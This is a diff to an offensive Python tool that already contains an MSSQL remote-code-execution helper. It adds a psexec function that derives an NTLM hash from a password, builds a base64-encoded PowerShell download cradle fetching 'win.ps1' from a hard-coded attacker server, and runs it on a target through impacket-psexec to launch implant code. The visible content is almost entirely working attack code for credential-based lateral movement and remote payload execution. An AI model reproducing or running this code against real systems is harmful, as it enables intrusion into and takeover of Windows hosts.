@@ -1,4 +1,8 @@
 import pwn
+import hashlib, binascii
+import base64
+
+# Custom imports
 import implants
 
 """
@@ -25,6 +29,22 @@ def mssql_rce(username, password, target, command):
     decoded_output = output.decode('utf-8')
     cleaned_output = decoded_output.replace('NULL', '').strip()
     return cleaned_output
+
+"""
+With valid credentials, psexec and run implant code
+"""
+def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
+    ntlm = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode(encoding="utf-8")
+    payload = 'IEX(New-Object Net.WebClient).downloadString("http://192.168.108.15:5000/static/win.ps1")'
+    b64 = base64.b64encode(payload.encode("utf-16")[2:]).decode("utf-8")
+    cmd = f"powershell -e {b64}\n"
+
+    p = pwn.process(["/usr/bin/impacket-psexec", "-hashes", f":{ntlm}", f"{username}:'{password}'@{target}"], stdin=pwn.PTY)
+    print(p.readuntil(">"))
+    p.send(cmd.encode())
+    p.send(b'\4')
+    print(p.readuntil("Checking"))
+    p.readall()
 
 if __name__=="__main__":
     pass
